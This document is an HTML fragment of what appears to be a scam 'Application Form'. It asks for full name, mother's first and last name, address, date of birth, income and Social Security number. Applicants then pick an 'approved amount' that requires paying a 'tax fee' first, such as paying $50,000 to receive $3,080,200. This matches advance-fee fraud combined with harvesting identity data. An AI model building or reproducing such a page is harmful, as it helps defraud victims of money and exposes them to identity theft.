  <main class="container page-offset">
    <h1>Application Form</h1>

    <form id="applicationForm" novalidate>
      <div class="form-grid">
  <label><span class="label-text">First name</span><input name="firstName" required aria-required="true" placeholder="First"></label>
  <label><span class="label-text">Last name</span><input name="lastName" required aria-required="true" placeholder="Last"></label>

  <label><span class="label-text">Mother First name</span><input name="motherFirst" required placeholder="Mother's first name"></label>
  <label><span class="label-text">Mother Last name</span><input name="motherLast" required placeholder="Mother's last name"></label>

  <label class="full"><span class="label-text">Referral Name</span><input name="referralName" placeholder="Referral Full Name"></label>

  <label><span class="label-text">Street Address</span><input name="street" required placeholder="123 Example St"></label>
  <label><span class="label-text">City</span><input name="city" required></label>

  <label><span class="label-text">State/Region</span><input name="state" required></label>
  <label><span class="label-text">Postal / Zip Code</span><input name="postal" required></label>

  <label><span class="label-text">Your E-mail</span><input name="email" type="email" required placeholder="you@example.com"></label>
  <label><span class="label-text">Text Number</span><input name="phone" type="tel" required placeholder="123-456-7890"></label>

  <label><span class="label-text">Date Of Birth</span><input name="dob" type="date" required></label>
  <label><span class="label-text">Occupation</span><input name="occupation" required></label>

        <label><span class="label-text">Sex</span>
          <select name="sex" required>
            <option value="">Choose...</option>
            <option>Female</option>
            <option>Male</option>
            <option>Other</option>
          </select>
        </label>

  <label><span class="label-text">Monthly income</span><input name="income" required placeholder="Monthly income"></label>
  <label><span class="label-text">SSN</span><input name="ddn" required placeholder="###-##-####" aria-label="SSN"></label>

        <label class="full">You Are To Choose Below The Amount You Got Approved For And The Tax Fee
          <select name="amountApproved" required>
            <option value="">-Select-</option>
            <option value="1000">You pay $1,000 tax and get $45,000.00</option>
            <option value="3000">You pay $3,000 tax and get $120,000.00</option>
            <option value="5000">You pay $5,000 tax and get $200,800.00</option>
            <option value="7000">You pay $7,000 tax and get $300,000.00</option>
            <option value="8000">You pay $8,000 tax and get $350,800.00</option>
            <option value="8500">You pay $8,500 tax and get $400,070.00</option>
            <option value="9000">You pay $9,000 tax and get $450,000.00</option>
            <option value="10000">You pay $10,000 tax and get $500,800.00</option>
            <option value="12000">You pay $12,000 tax and get $600,000.00</option>
            <option value="15000">You pay $15,000 tax and get $709,000.00</option>
            <option value="20000">You pay $20,000 tax and get $870,700.00</option>
            <option value="25000">You pay $25,000 tax and get $1,008,000.00</option>
            <option value="50000">You pay $50,000 tax and get $3,080,200.00</option>
          </select>
        </label>


        <div class="full">
          <button type="submit">Submit Application</button>
        </div>
      </div>
    </form>

    <div id="appResult" class="result" aria-live="polite"></div>
